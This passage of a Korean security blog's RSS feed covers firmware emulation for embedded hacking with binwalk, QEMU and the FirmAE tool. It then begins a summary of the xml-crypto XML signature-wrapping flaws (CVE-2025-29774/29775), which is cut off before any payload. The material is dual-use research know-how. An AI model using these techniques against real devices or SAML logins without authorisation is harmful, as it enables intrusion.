&#xAC15;&#xD569;&#xB2C8;&#xB2E4;. &#xAE30;&#xC874; &#xD558;&#xB4DC;&#xC6E8;&#xC5B4; &#xC7A5;&#xBE44;&#xC640; &#xCCB4;&#xACC4;&#xAC00; &#xAC16;&#xCD94;&#xC9C0; &#xBABB;&#xD55C; &#xC0C1;&#xD0DC;&#xC5D0;&#xC11C; &#xB3D9;&#xC791; &#xC2DC;&#xD0A4;&#xB824;&#xB294; &#xACBD;&#xC6B0;&#xAC00; &#xB9CE;&#xAE30; &#xB54C;&#xBB38;&#xC5D0;, &#xD558;&#xB4DC;&#xC6E8;&#xC5B4; &#xC791;&#xC5C5; &#xC5ED;&#xC2DC; &#xC18C;&#xD504;&#xD2B8;&#xC6E8;&#xC5B4;&#xB85C; &#xBAA8;&#xBC29;&#xD558;&#xB294; &#xAC83;&#xC774; &#xC911;&#xC694;&#xD569;&#xB2C8;&#xB2E4;. &#xB610;&#xD55C;, &#xB300;&#xBD80;&#xBD84;&#xC758; &#xC138;&#xBD80; &#xAE30;&#xB2A5;&#xAE4C;&#xC9C0; &#xC0AC;&#xC6A9;&#xD558;&#xB824;&#xB294; &#xAC83; &#xC5ED;&#xC2DC; &#xC8FC;&#xBAA9;&#xC801;&#xC774;&#xBBC0;&#xB85C; &#xAC70;&#xC758; &#xBAA8;&#xB4E0; &#xAE30;&#xB2A5;&#xC744; &#xAD6C;&#xD604;&#xD558;&#xB294; &#xACBD;&#xC6B0;&#xAC00; &#xB9CE;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC5D0;&#xBBAC;&#xB808;&#xC774;&#xC158;&#xC740; &#xB2CC;&#xD150;&#xB3C4;/&#xC548;&#xB4DC;&#xB85C;&#xC774;&#xB4DC; &#xC5D0;&#xBBAC;&#xB808;&#xC774;&#xD130;&#xB97C; &#xC0DD;&#xAC01;&#xD558;&#xC2DC;&#xBA74; &#xD3B8;&#xD569;&#xB2C8;&#xB2E4;! &#xB2CC;&#xD150;&#xB3C4;/&#xC548;&#xB4DC;&#xB85C;&#xC774;&#xB4DC;&#xC758; &#xC5D0;&#xBBAC;&#xB808;&#xC774;&#xD130;&#xC758; &#xC8FC;&#xBAA9;&#xC801;&#xC740; PC &#xD658;&#xACBD;&#xC5D0;&#xC11C; &#xB2CC;&#xD150;&#xB3C4;&#xC640; &#xC548;&#xB4DC;&#xB85C;&#xC774;&#xB4DC; &#xAC8C;&#xC784;&#xC744; &#xC990;&#xAE30;&#xB294; &#xAC83;&#xC785;&#xB2C8;&#xB2E4;. &#xADF8;&#xB807;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xAC8C;&#xC784;&#xC758; &#xBAA8;&#xB4E0; &#xAE30;&#xB2A5;&#xC774; &#xC798; &#xB3CC;&#xC544;&#xAC00;&#xB3C4;&#xB85D; &#xC124;&#xACC4;&#xB418;&#xC5B4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#x1F4F1;</p><p><img src="image03.png" alt="image03.png"></p><p>&#xB458;&#xC744; &#xC5EE;&#xC5B4;&#xC11C; &#xC0DD;&#xAC01;&#xD558;&#xBA74; &#xC544;&#xB798; &#xC0AC;&#xC9C4;&#xCC98;&#xB7FC; &#xC0DD;&#xAC01;&#xD558;&#xC2DC;&#xBA74; &#xC88B;&#xC744; &#xAC83; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;!</p><p><img src="image04.jpg" alt="image04.jpg"></p><p>&#xB2E4;&#xC2DC; &#xB3CC;&#xC544;&#xC640;&#xC11C;, &#xC784;&#xBCA0;&#xB514;&#xB4DC; &#xD574;&#xD0B9;&#xC5D0;&#xC11C;&#xB294; &#xD68D;&#xB4DD;&#xD55C; &#xD38C;&#xC6E8;&#xC5B4;&#xB97C; &#xB3D9;&#xC801;&#xC73C;&#xB85C; &#xBD84;&#xC11D;&#xD558;&#xB294; &#xAC83;&#xC774; &#xC8FC;&#xBAA9;&#xC801;&#xC785;&#xB2C8;&#xB2E4;. &#xC784;&#xBCA0;&#xB514;&#xB4DC; &#xC7A5;&#xBE44;&#xC758; &#xACBD;&#xC6B0; &#xC5EC;&#xB7EC; &#xC13C;&#xC11C;&#xC640; &#xD558;&#xB4DC;&#xC6E8;&#xC5B4;&#xB85C; &#xB3D9;&#xC791;&#xC744; &#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0;, &#xAD00;&#xB828; &#xD558;&#xB4DC;&#xC6E8;&#xC5B4; &#xC758;&#xC874;&#xC131;&#xC774; &#xCDA9;&#xC871;&#xB418;&#xC9C0; &#xC54A;&#xC73C;&#xBA74; &#xB3D9;&#xC791;&#xD558;&#xC9C0; &#xC54A;&#xB294; &#xACBD;&#xC6B0;&#xAC00; &#xB9CE;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB610;&#xD55C;, &#xC784;&#xBCA0;&#xB514;&#xB4DC; &#xC2DC;&#xC2A4;&#xD15C;&#xC740; RISC &#xC544;&#xD0A4;&#xD14D;&#xCC98;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xACBD;&#xC6B0;&#xAC00; &#xB9CE;&#xC740;&#xB370;, &#xC774;&#xB294; &#xC8FC; &#xBD84;&#xC11D; &#xD658;&#xACBD;&#xC758; CISC &#xC544;&#xD0A4;&#xD14D;&#xCC98;&#xC640; &#xB2E4;&#xB978; &#xD658;&#xACBD;&#xC5D0;&#xC11C; &#xAD6C;&#xB3D9;&#xC744; &#xC2DC;&#xCF1C;&#xC57C; &#xD558;&#xB294; &#xC0C1;&#xD669;&#xC785;&#xB2C8;&#xB2E4;. &#xADF8;&#xB9AC;&#xACE0; &#xC7A5;&#xBE44;&#xC758; &#xBAA8;&#xB4E0; &#xAE30;&#xB2A5;&#xC744; &#xB3D9;&#xC801;&#xC73C;&#xB85C; &#xBD84;&#xC11D;&#xD574;&#xC57C; &#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0;, &#xB300;&#xBD80;&#xBD84;&#xC758; &#xC138;&#xBD80; &#xAE30;&#xB2A5;&#xAE4C;&#xC9C0; &#xC2E4;&#xD589; &#xAC00;&#xB2A5;&#xD574;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;. &#x1F477;&#x1F3FB;</p><p>&#xB530;&#xB77C;&#xC11C;, &#xC5D0;&#xBBAC;&#xB808;&#xC774;&#xC158; &#xAD00;&#xC810;&#xC5D0;&#xC11C; &#xD38C;&#xC6E8;&#xC5B4;&#xB97C; &#xBC14;&#xB77C;&#xBCF4;&#xACE0; &#xAD00;&#xB828; &#xD658;&#xACBD;&#xC744; &#xAD6C;&#xCD95;&#xD574;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;. &#xC2E4;&#xC81C;&#xB85C; &#xC784;&#xBCA0;&#xB514;&#xB4DC; &#xD574;&#xD0B9; &#xBD84;&#xC57C;&#xC758; &#xB2E4;&#xB978; &#xAE00;&#xB4E4; &#xB610;&#xD55C; &#xD38C;&#xC6E8;&#xC5B4; &#xC5D0;&#xBBAC;&#xB808;&#xC774;&#xD305;&#xC73C;&#xB85C; &#xC791;&#xC131;&#xB41C; &#xAE00;&#xC774; &#xB9CE;&#xC740; &#xAC83;&#xC774; &#xC774;&#xB97C; &#xC99D;&#xBA85;&#xD55C;&#xB2E4;&#xACE0; &#xC0DD;&#xAC01;&#xD569;&#xB2C8;&#xB2E4;!</p><h2 id="2-&#xD38C;&#xC6E8;&#xC5B4;-&#xBD84;&#xC11D;"><a href="#2-&#xD38C;&#xC6E8;&#xC5B4;-&#xBD84;&#xC11D;" class="headerlink" title="2. &#xD38C;&#xC6E8;&#xC5B4; &#xBD84;&#xC11D;"></a>2. &#xD38C;&#xC6E8;&#xC5B4; &#xBD84;&#xC11D;</h2><p>&#xD38C;&#xC6E8;&#xC5B4; &#xC5D0;&#xBBAC;&#xB808;&#xC774;&#xD305;&#xC744; &#xD558;&#xAE30; &#xC704;&#xD574;&#xC11C;&#xB294; &#xD574;&#xB2F9; &#xD38C;&#xC6E8;&#xC5B4;&#xAC00; &#xC5B4;&#xB5A4; &#xD658;&#xACBD;&#xC5D0;&#xC11C; &#xAD6C;&#xCD95;&#xB418;&#xACE0; &#xB3D9;&#xC791; &#xB418;&#xB294;&#xC9C0; &#xBD84;&#xC11D;&#xD558;&#xB294; &#xAC83;&#xC774; &#xC6B0;&#xC120;&#xC785;&#xB2C8;&#xB2E4;. &#x261D;&#x1F3FB;</p><p><img src="image05.jpg" alt="image05.jpg"></p><p>binwalk&#xB85C; &#xD38C;&#xC6E8;&#xC5B4;&#xC5D0;&#xC11C; &#xBD84;&#xC11D;&#xD560; &#xC218; &#xC788;&#xB294; &#xC815;&#xBCF4;&#xB294; &#xD06C;&#xAC8C; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;. 3&#xFE0F;&#x20E3;</p><ul><li>&#xC544;&#xD0A4;&#xD14D;&#xCC98;</li><li>&#xCEE4;&#xB110;</li><li>&#xB8E8;&#xD2B8; &#xD30C;&#xC77C; &#xC2DC;&#xC2A4;&#xD15C;</li></ul><p>binwalk&#xB97C; &#xD1B5;&#xD574; &#xC608;&#xC81C; &#xD38C;&#xC6E8;&#xC5B4;&#xC758; &#xC544;&#xD0A4;&#xD14D;&#xCC98;&#xC640; &#xCEE4;&#xB110; &#xB4F1;&#xC758; &#xC815;&#xBCF4;&#xB97C; &#xC54C;&#xC544;&#xB0BC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs bash">binwalk firmware.bin</code></pre><p><img src="image06.png" alt="image06.png"></p><p><code>-A</code> &#xC635;&#xC158;&#xC73C;&#xB85C; &#xD30C;&#xC77C;&#xC758; &#xC544;&#xD0A4;&#xD14D;&#xCC98; &#xC815;&#xBCF4;&#xB97C; &#xB354; &#xC0C1;&#xC138;&#xD788; &#xBCFC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#x1F50D;</p><p><code>-e</code> &#xC635;&#xC158;&#xC73C;&#xB85C; &#xBD84;&#xC11D;&#xD55C; &#xC601;&#xC5ED;&#xB4E4;&#xC758; &#xD30C;&#xC77C;&#xB4E4;&#xC744; &#xCD94;&#xCD9C;&#xD569;&#xB2C8;&#xB2E4;.</p><p>binwalk&#xB85C; &#xCD94;&#xCD9C;&#xD55C; &#xD30C;&#xC77C; &#xBA85;&#xC774; &#xC22B;&#xC790;&#xB85C; &#xB418;&#xC5B4; &#xC788;&#xB294;&#xB370;, &#xC774;&#xB294; &#xAC01; &#xC601;&#xC5ED;&#xB9C8;&#xB2E4; &#xAD6C;&#xBD84;&#xD574;&#xC11C; &#xB530;&#xB85C; &#xC800;&#xC7A5;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC785;&#xB2C8;&#xB2E4;. binwalk &#xBA85;&#xB839;&#xC73C;&#xB85C; &#xD655;&#xC778;&#xB9CC; &#xD30C;&#xC77C;&#xB4E4;&#xC758; &#xC8FC;&#xC18C;&#xB97C; &#xCC38;&#xACE0;&#xD558;&#xBA74; &#xC5B4;&#xB5A4; &#xD30C;&#xC77C;&#xC778;&#xC9C0; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs bash">binwalk -e firmware.binbinwalk -A kernel</code></pre><p><img src="image07.png" alt="image07.png"></p><p>&#xC784;&#xBCA0;&#xB514;&#xB4DC; &#xD658;&#xACBD;&#xC5D0;&#xC11C;&#xB294; ARM, MIPS &#xB4F1;&#xACFC; &#xAC19;&#xC740; RISC &#xC544;&#xD0A4;&#xD14D;&#xCC98;&#xB97C; &#xB9CE;&#xC774; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;. &#xADF8;&#xB7EC;&#xB098; ARM, MIPS&#xB3C4; &#xC5D4;&#xB514;&#xC548;&#xC5D0; &#xB530;&#xB77C; &#xBA85;&#xCE6D;&#xC5D0; &#xCC28;&#xC774;&#xAC00; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#x1F95A;</p><p>mips&#xB294; &#xAE30;&#xBCF8;&#xC801;&#xC73C;&#xB85C; &#xBE45; &#xC5D4;&#xB514;&#xC548;&#xC744; &#xC9C0;&#xC6D0;&#xD569;&#xB2C8;&#xB2E4;. mipsel&#xC740; &#xB9AC;&#xD2C0; &#xC5D4;&#xB514;&#xC548;&#xC744; &#xC9C0;&#xC6D0;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB7F0; &#xBA85;&#xCE6D;&#xC758; &#xCC28;&#xC774;&#xC758; &#xC720;&#xC758;&#xD558;&#xBA74; &#xB418;&#xACE0;, &#xC774;&#xB294; binwalk&#xC5D0;&#xC11C; &#xC5B4;&#xB5A4; &#xC544;&#xD0A4;&#xD14D;&#xCC98;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xC9C0; &#xC798; &#xCD9C;&#xB825;&#xD574;&#xC8FC;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xD655;&#xC778;&#xB9CC; &#xD558;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;.</p><h2 id="3-QEMU"><a href="#3-QEMU" class="headerlink" title="3. QEMU"></a>3. QEMU</h2><p>&#xD38C;&#xC6E8;&#xC5B4; &#xC815;&#xBCF4;&#xAE4C;&#xC9C0; &#xD655;&#xC778;&#xD558;&#xC600;&#xB2E4;&#xBA74;, &#xC774;&#xC81C; &#xD38C;&#xC6E8;&#xC5B4;&#xB97C; &#xC5D0;&#xBBAC;&#xB808;&#xC774;&#xD305;&#xD560; &#xCC28;&#xB840;&#xC785;&#xB2C8;&#xB2E4;. &#xD38C;&#xC6E8;&#xC5B4;&#xB294; QEMU &#xAC00;&#xC0C1; &#xBA38;&#xC2E0; &#xC704;&#xC5D0; &#xC62C;&#xB824;&#xC11C; &#xB3D9;&#xC791; &#xC2DC;&#xD0AC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#x1F4A8;</p><p><img src="image08.jpg" alt="image08.jpg"></p><p>QEMU&#xB294; &#xAC00;&#xC0C1;&#xD654; &#xC18C;&#xD504;&#xD2B8;&#xC6E8;&#xC5B4;&#xB85C;, &#xBE60;&#xB978; &#xC5D0;&#xBBAC;&#xB808;&#xC774;&#xC158; &#xD658;&#xACBD;&#xC744; &#xAD6C;&#xCD95;&#xD560; &#xB54C; &#xC790;&#xC8FC; &#xC0AC;&#xC6A9;&#xB429;&#xB2C8;&#xB2E4;. &#xC635;&#xC158;&#xC73C;&#xB85C; &#xAD00;&#xB828; &#xCEE4;&#xB110;, &#xC774;&#xBBF8;&#xC9C0; &#xB4F1;&#xC758; &#xD30C;&#xC77C;&#xC744; &#xC9C0;&#xC815;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC124;&#xCE58;&#xB294; apt&#xB85C; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xACF5;&#xC720;&#xAE30; &#xD38C;&#xC6E8;&#xC5B4;&#xC758; &#xACBD;&#xC6B0; &#xBCF4;&#xD1B5; &#xD38C;&#xC6E8;&#xC5B4; &#xC774;&#xC678;&#xC758; &#xD2B9;&#xBCC4;&#xD55C; &#xC758;&#xC874; &#xD558;&#xB4DC;&#xC6E8;&#xC5B4;&#xB098; &#xC13C;&#xC11C;&#xAC00; &#xC5C6;&#xB294; &#xACBD;&#xC6B0;&#xAC00; &#xB9CE;&#xAE30; &#xB54C;&#xBB38;&#xC5D0;, &#xAD00;&#xB828; &#xCEE4;&#xB110; &#xBC0F; &#xC774;&#xBBF8;&#xC9C0;&#xB97C; &#xB9DE;&#xCD98;&#xB2E4;&#xBA74; &#xBC14;&#xB85C; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC544;&#xB798; &#xB9C1;&#xD06C;&#xB97C; &#xD1B5;&#xD574;&#xC11C; &#xD574;&#xB2F9;&#xD558;&#xB294; &#xC544;&#xD0A4;&#xD14D;&#xCC98;&#xC758; &#xD30C;&#xC77C;&#xB4E4;&#xC744; &#xBC1B;&#xC744; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#x1F4BE;</p><p><a href="https://people.debian.org/~aurel32/qemu/">https://people.debian.org/~aurel32/qemu/</a></p><p>&#xAD00;&#xB828; &#xD30C;&#xC77C;&#xC744; &#xC218;&#xB3D9;&#xC73C;&#xB85C; &#xB9DE;&#xCD94;&#xACE0; &#xB124;&#xD2B8;&#xC6CC;&#xD06C; &#xC138;&#xD305; &#xD6C4; &#xAD6C;&#xB3D9;&#xC5D0; &#xC131;&#xACF5;&#xD558;&#xBA74; &#xC544;&#xB798;&#xCC98;&#xB7FC; &#xACF5;&#xC720;&#xAE30; &#xD398;&#xC774;&#xC9C0;&#xB97C; &#xC811;&#xADFC;&#xD560; &#xC218; &#xC788;&#xACE0;, &#xC2E4;&#xC81C; &#xB8E8;&#xD2B8; &#xD30C;&#xC77C; &#xC2DC;&#xC2A4;&#xD15C;&#xC5D0; &#xC874;&#xC7AC;&#xD558;&#xB294; &#xB300;&#xBD80;&#xBD84;&#xC758; &#xAE30;&#xB2A5;&#xC744; &#xC0AC;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#x1F310;</p><p><img src="image09.jpg" alt="image09.jpg"></p><p>&#xCD9C;&#xCC98;: Bach`s Blog</p><h2 id="4-FirmAE"><a href="#4-FirmAE" class="headerlink" title="4. FirmAE"></a>4. FirmAE</h2><p>QEMU&#xB294; &#xC9C1;&#xC811; &#xB124;&#xD2B8;&#xC6CC;&#xD06C; &#xC138;&#xD305;&#xACFC; &#xAD00;&#xB828; &#xD30C;&#xC77C;&#xC744; &#xC190;&#xC218; &#xB9DE;&#xCD94;&#xC5B4;&#xC57C; &#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xB2E4;&#xC18C; &#xBD88;&#xD3B8;&#xD55C; &#xBD80;&#xBD84;&#xC774; &#xB9CE;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xD558;&#xC9C0;&#xB9CC;, &#xC778;&#xAC04;&#xC740; &#xB610; &#xBC29;&#xBC95;&#xC744; &#xB9CC;&#xB4E4;&#xC5B4; &#xB193;&#xC558;&#xC2B5;&#xB2C8;&#xB2E4;! &#xC774;&#xB7F0; &#xC5D0;&#xBBAC;&#xB808;&#xC774;&#xD305;&#xC744; &#xBCF4;&#xB2E4; &#xC190;&#xC27D;&#xAC8C; &#xB3C4;&#xC640;&#xC8FC;&#xB294; &#xB3C4;&#xAD6C;&#xAC00; &#xC788;&#xC73C;&#xB2C8;&#x2026;</p><p>&#xC774; &#xAE00;&#xC758; &#xC8FC;&#xC81C;&#xC778; FirmAE&#xC785;&#xB2C8;&#xB2E4;! &#x1F941;</p><p><a href="https://github.com/pr0v3rbs/FirmAE">https://github.com/pr0v3rbs/FirmAE</a></p><p><img src="image10.png" alt="image10.png"></p><p>FirmAE&#xB294; KAIST SysSec Lab&#xC5D0;&#xC11C; &#xC81C;&#xC791;&#xD55C; &#xD38C;&#xC6E8;&#xC5B4; &#xC5D0;&#xBBAC;&#xB808;&#xC774;&#xD305; &#xC790;&#xB3D9;&#xD654; &#xB3C4;&#xAD6C;&#xC785;&#xB2C8;&#xB2E4;! &#xC5F0;&#xAD6C;&#xD300;&#xC740; &#xACF5;&#xC720;&#xAE30;&#xC640; IP &#xCE74;&#xBA54;&#xB77C; &#xD38C;&#xC6E8;&#xC5B4; &#xC774;&#xBBF8;&#xC9C0;&#xB4E4;&#xC744; &#xB300;&#xC0C1;&#xC73C;&#xB85C; &#xD14C;&#xC2A4;&#xD2B8;&#xB97C; &#xD558;&#xC5EC; &#xBCF4;&#xB2E4; &#xC190;&#xC27D;&#xAC8C; &#xC5D0;&#xBBAC;&#xB808;&#xC774;&#xD305;&#xC744; &#xB3C4;&#xC640;&#xC8FC;&#xB294; &#xB3C4;&#xAD6C;&#xB97C; &#xC81C;&#xC791;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. FirmAE&#xB294; QEMU&#xC640; Binwalk &#xAE30;&#xBC18;&#xC73C;&#xB85C; &#xC81C;&#xC791;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#x1F528;</p><p>github&#xC5D0;&#xC11C; &#xC124;&#xCE58; &#xBC0F; &#xC5D0;&#xBBAC;&#xB808;&#xC774;&#xD305;&#xC744; &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs bash"><span class="hljs-comment"># &#xB2E4;&#xC6B4;&#xB85C;&#xB4DC; &#xBC0F; &#xC138;&#xD305;</span>sudo apt-get install -y bc fdisk qemu qemu-system-mips64 python3-psycopg2git <span class="hljs-built_in">clone</span> --recursive https://github.com/pr0v3rbs/FirmAE<span class="hljs-built_in">cd</span> ./FirmAE./download.sh./install.sh./init.sh<span class="hljs-comment"># FirmAE/firmwares &#xB514;&#xB809;&#xD1A0;&#xB9AC;&#xC5D0; &#xD38C;&#xC6E8;&#xC5B4; &#xC774;&#xB3D9;</span>sudo ./run.sh -c VENDOR ./firmwares/sudo ./run.sh -d VENDOR ./firmwares/</code></pre><p>FirmAE&#xB85C; &#xC608;&#xC81C; &#xACF5;&#xC720;&#xAE30; &#xD38C;&#xC6E8;&#xC5B4;&#xB97C; &#xC5D0;&#xBBAC;&#xB808;&#xC774;&#xD305; &#xC2DC;&#xD0A4;&#xBA74;, &#xC544;&#xB798;&#xCC98;&#xB7FC; &#xACF5;&#xC720;&#xAE30; &#xD398;&#xC774;&#xC9C0;&#xC5D0; &#xC811;&#xADFC;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;! &#xC5D0;&#xBBAC;&#xB808;&#xC774;&#xD305; &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xC2DC;&#xAC04;&#xC774; &#xAF64;&#xB098; &#xB9CE;&#xC774; &#xC18C;&#xC694;&#xB418;&#xB2C8;, &#xC778;&#xB0B4;&#xC2EC;&#xC744; &#xAC00;&#xC9C0;&#xACE0; &#xAE30;&#xB2E4;&#xB9AC;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;. &#xD3C9;&#xADE0; 2-30&#xBD84;(!) &#xC815;&#xB3C4; &#xC18C;&#xC694;&#xB41C;&#xB2E4;&#xACE0; &#xC0DD;&#xAC01;&#xD558;&#xC2DC;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;. &#x2615;</p><p><img src="image11.png" alt="image11.png"></p><p>&#xADF8;&#xB7EC;&#xB098; FirmAE&#xB294; &#xC635;&#xC158;&#xC5D0;&#xB3C4; &#xC54C; &#xC218; &#xC788;&#xB4EF;&#xC774;, &#xC5F0;&#xAD6C;&#xD300;&#xC774; &#xAE30;&#xC874;&#xC5D0; &#xD14C;&#xC2A4;&#xD2B8; &#xC2DC;&#xCF1C; &#xB193;&#xC740; &#xC720;&#xBA85; &#xD68C;&#xC0AC;&#xC758; &#xACF5;&#xC720;&#xAE30;&#xC640; IP &#xCE74;&#xBA54;&#xB77C; &#xC81C;&#xD488; &#xBC0F; &#xBAA8;&#xB378;&#xC744; &#xAE30;&#xC900;&#xC73C;&#xB85C; &#xC81C;&#xC791;&#xC774; &#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADF8;&#xB807;&#xAE30; &#xB54C;&#xBB38;&#xC5D0;, &#xC18C;&#xC218;&#xC758; &#xD2B9;&#xC815; &#xC81C;&#xD488;&#xC774;&#xB098; &#xB2E4;&#xB978; &#xC784;&#xBCA0;&#xB514;&#xB4DC; &#xBC0F; IoT &#xAE30;&#xAE30;&#xC5D0;&#xB294; &#xC5D0;&#xBBAC;&#xB808;&#xC774;&#xD305;&#xC774; &#xC798; &#xC548;&#xB418;&#xB294; &#xACBD;&#xC6B0;&#xAC00; &#xC885;&#xC885; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADF8;&#xB9AC;&#xACE0; gdbserver &#xAE30;&#xB2A5; &#xB610;&#xD55C; &#xC81C;&#xACF5;&#xB418;&#xB294;&#xB370;, &#xC774; &#xC5ED;&#xC2DC; &#xC798; &#xB3D9;&#xC791;&#xD558;&#xC9C0; &#xC54A;&#xB294; &#xACBD;&#xC6B0;&#xAC00; &#xB9CE;&#xC2B5;&#xB2C8;&#xB2E4;. &#x1F972;</p><p><img src="image12.jpg" alt="image12.jpg"></p><p>&#xB2E4;&#xC74C; part2&#xC5D0;&#xC11C;&#xB294; FirmAE&#xC758; &#xB0B4;&#xBD80; &#xAD6C;&#xC131;&#xACFC; &#xB3D9;&#xC791;&#xC744; &#xBD84;&#xC11D;&#xD558;&#xACE0;, &#xB2E4;&#xB978; &#xD658;&#xACBD; &#xBC0F; &#xD30C;&#xC77C;&#xC5D0;&#xC11C;&#xB3C4; &#xC798; &#xB3D9;&#xC791;&#xD558;&#xACE0;, &#xC81C;&#xACF5;&#xD558;&#xB294; &#xB2E4;&#xC591;&#xD55C; &#xAE30;&#xB2A5;&#xC744; &#xC798; &#xD65C;&#xC6A9;&#xD558;&#xC5EC; &#xD38C;&#xC6E8;&#xC5B4;&#xB97C; &#xC5D0;&#xBBAC;&#xB808;&#xC774;&#xD305;&#xD558;&#xB294; &#xAE00;&#xB85C; &#xCC3E;&#xC544;&#xC624;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;! &#x1F919;&#x1F3FB;</p><p>&#xAC10;&#xC0AC;&#xD569;&#xB2C8;&#xB2E4;!</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/firmware/">firmware</category>
      
      <category domain="https://hackyboiz.github.io/tags/newp1ayer48/">newp1ayer48</category>
      
      <category domain="https://hackyboiz.github.io/tags/Embedded/">Embedded</category>
      
      <category domain="https://hackyboiz.github.io/tags/Emulation/">Emulation</category>
      
      
      <comments>https://hackyboiz.github.io/2025/05/08/newp1ayer48/emulation1/ko/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2025-29774, CVE-2025-29775 : xml-crypto의 XML Signature Wrapping 취약점</title>
      <link>https://hackyboiz.github.io/2025/05/07/romi0x/1day1line0507/</link>
      <guid>https://hackyboiz.github.io/2025/05/07/romi0x/1day1line0507/</guid>
      <pubDate>Wed, 07 May 2025 08:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://workos.com/blog/samlstorm&quot;&gt;https://workos.com/blo</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://workos.com/blog/samlstorm">https://workos.com/blog/samlstorm</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>xml-crypto &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC; (&#xBC84;&#xC804; &lt;= 6.0.0)</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>&#xC774;&#xBC88; &#xCDE8;&#xC57D;&#xC810;&#xC740; XML &#xB514;&#xC9C0;&#xD138; &#xC11C;&#xBA85; &#xAC80;&#xC99D; &#xB85C;&#xC9C1;&#xC758; &#xD5C8;&#xC810;&#xC744; &#xC545;&#xC6A9;&#xD558;&#xC5EC; SAML &#xC751;&#xB2F5; &#xB610;&#xB294; XML &#xC11C;&#xBA85; &#xAE30;&#xBC18; &#xC778;&#xC99D; &#xBA54;&#xCEE4;&#xB2C8;&#xC998;&#xC744; &#xC6B0;&#xD68C;&#xD560; &#xC218; &#xC788;&#xB294; &#xCDE8;&#xC57D;&#xC810;&#xC785;&#xB2C8;&#xB2E4;. &#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC740; <code>xml-crypto</code> &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC;&#xC758; &#xC11C;&#xBA85; &#xAC80;&#xC99D; &#xBC29;&#xC2DD;&#xC758; &#xAD6C;&#xC870;&#xC801; &#xBB38;&#xC81C;&#xC5D0;&#xC11C; &#xBE44;&#xB86F;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. CVE-2025-29774&#xC640; CVE-2025-29775 &#xB450; &#xAC74;&#xC73C;&#xB85C; &#xB098;&#xB258;&#xC5B4; &#xACF5;&#xAC1C;&#xB410;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><strong>CVE-2025-29774</strong>&#xB294; &#x201C;SignedInfo &#xB178;&#xB4DC; &#xC911;&#xBCF5;&#x201D;&#xC744; &#xC774;&#xC6A9;&#xD55C; &#xCDE8;&#xC57D;&#xC810;&#xC785;&#xB2C8;&#xB2E4;. &#xC815;&#xC0C1;&#xC801;&#xC778; &#xC11C;&#xBA85;&#xB41C; XML &#xBB38;&#xC11C;&#xB294; <code>&lt;Signature&gt;</code> &#xB178;&#xB4DC; &#xB0B4;&#xC5D0; &#xB2E8; &#xD558;&#xB098;&#xC758; <code>&lt;SignedInfo&gt;</code> &#xB178;&#xB4DC;&#xB9CC; &#xC874;&#xC7AC;&#xD574;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;. &#xADF8;&#xB7EC;&#xB098; <code>xml-crypto</code>&#xC758; &#xCDE8;&#xC57D; 